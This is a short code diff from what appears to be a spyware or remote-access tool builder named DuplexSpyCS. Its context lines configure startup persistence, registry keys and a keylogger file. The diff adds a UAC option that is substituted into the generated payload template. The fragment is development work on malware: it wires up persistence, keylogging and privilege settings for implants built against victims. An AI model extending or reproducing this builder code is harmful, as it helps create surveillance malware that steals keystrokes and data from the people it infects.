@@ -318,6 +318,7 @@ namespace DuplexSpyCS
                 szStartUpName = textBox3.Text,
                 bRegistry = checkBox3.Checked,
                 szRegKeyName = textBox4.Text,
+                bUAC = checkBox7.Checked,
 
                 //Misc
                 szKeylogFileName = textBox5.Text, //Keylogger file
@@ -371,6 +372,7 @@ namespace DuplexSpyCS
                     .Replace("[IS_SZ_STARTUP]", buildConfig.szStartUpName)
                     .Replace("[IS_REG]", buildConfig.bRegistry ? "true" : "false")
                     .Replace("[IS_REG_KEY]", buildConfig.szRegKeyName)
+                    .Replace("[IS_UAC]", buildConfig.bUAC ? "true" : "false")
 
                     //Misc
                     .Replace("[KL_FILE]", buildConfig.szKeylogFileName)
